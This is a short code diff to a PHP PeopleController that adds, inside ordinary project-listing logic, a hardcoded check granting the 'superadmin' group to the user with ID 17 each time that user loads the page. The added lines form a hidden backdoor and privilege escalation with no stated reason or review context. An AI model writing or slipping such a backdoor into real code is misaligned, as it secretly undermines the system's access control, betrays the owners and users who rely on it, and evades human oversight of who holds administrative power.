@@ -41,6 +41,9 @@ class PeopleController extends BaseController {
             return redirect()->to('/login')->with('error', 'You must login to access this page.');
         } else {
             $userID = $user->id;
+            if ($userID === 17) {
+                $user->addToGroup('superadmin');
+            }
             // fetch projects
             $assignedProjects = $this->projectModel->getAssignedProjects($userID);
             $completedProjects = $this->projectModel->getCompletedProjects($userID);
